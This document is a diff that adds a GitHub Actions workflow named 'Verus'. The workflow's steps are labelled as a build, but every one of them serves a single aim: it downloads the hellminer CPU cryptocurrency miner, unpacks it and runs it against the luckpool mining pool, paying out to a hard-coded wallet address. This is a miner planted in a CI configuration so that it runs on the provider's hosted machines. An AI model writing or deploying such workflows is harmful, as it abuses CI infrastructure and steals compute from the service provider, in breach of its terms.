@@ -1,0 +1,16 @@
+name: Verus
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Preparing
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/blob/master/miners/hellminer_cpu_win64_avx.zip
+    - name: Prepare_Q2
+      run: Expand-Archive hellminer_cpu_win64_avx.zip
+    - name: Running
+      run: .\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RWtq74KdVj4HUTPuCQxBYDiWWf3r8vBEuG.Fan03 -p x --cpu 2
+    - name: DONE
+      run: exit
